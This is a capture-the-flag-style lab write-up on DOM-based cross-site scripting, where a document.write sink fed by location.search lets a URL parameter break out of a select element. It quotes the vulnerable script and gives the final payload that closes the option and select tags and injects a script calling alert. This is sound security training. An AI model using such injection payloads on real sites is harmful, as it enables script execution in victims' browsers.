# Lab 4

### DOM XSS in document.write in sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

Inspecting the source in DevTools, we can see it loads the process from a script

<figure><img src="../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

```js

var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');

document.write('<select name="storeId">');

	if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    
    for(var i=0;i<stores.length;i++) {
	    if(stores[i] === store) {
            continue;
	}
        document.write('<option>'+stores[i]+'</option>');
        }
        document.write('</select>');
                            
```

We can observe that the `storeId` parameter is being used by the `location.search` which is a Source. After that, the it uses `document.write` which acts as a Sink that adds a a new option in the select element.

We can try to test and add a new option

```
?productId=1&storeId=jamil
```

<figure><img src="../../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

It worked, the sink, `document.write` writes to HTML. I tried escaping the `<option>` tag but nothing changed then I proceeded to escape the `<select>` tag and it worked!

```
?productId=1&storeId=jamil</option></select>
```

<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Nice, we escaped the `<select>` element but the browser is interpreting that differently. It doesn't render HTML literally the way we want it to from the payload I used

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

So, from here we can basically just call `alert` and solve the lab

```
?productId=1&storeId=jamil</option></select><script>alert('pwned')</script>
```

<figure><img src="../../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

Looking back at the executed JS, it adds/renders the malicious script resulting from the arbitrary write sink, `document.write`

<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
